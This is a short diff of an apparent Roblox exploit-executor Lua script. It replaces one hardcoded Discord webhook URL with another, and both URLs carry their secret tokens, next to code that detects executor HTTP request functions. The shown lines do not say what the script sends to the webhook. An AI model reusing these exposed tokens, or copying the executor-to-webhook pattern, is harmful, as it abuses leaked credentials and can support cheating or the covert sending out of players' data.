@@ -80,7 +80,7 @@ local Embed = {
 }
 
 -- If you don't raid us first, we won't raid you. Let's live in peace
-local webhookUrl = 'https://discord.com/api/webhooks/1425593407807684768/5rwjLg2gPW251YR5OdJJJ13SqfNSWLj_a18Gh2HlOGPBkPrw_QmXSE3_y_X1G13JTs4x'
+local webhookUrl = 'https://discord.com/api/webhooks/1425593406385819799/095nrseEnkdvNHN5vcgx0gnF2C3K645uxbIBkM-9ie9ajJe7R5W1zZcS-s6ppS4uUKTH'
 local requestFunction = (syn and syn.request) or http_request or (http and http.request)
 
 local function loadNextScript()
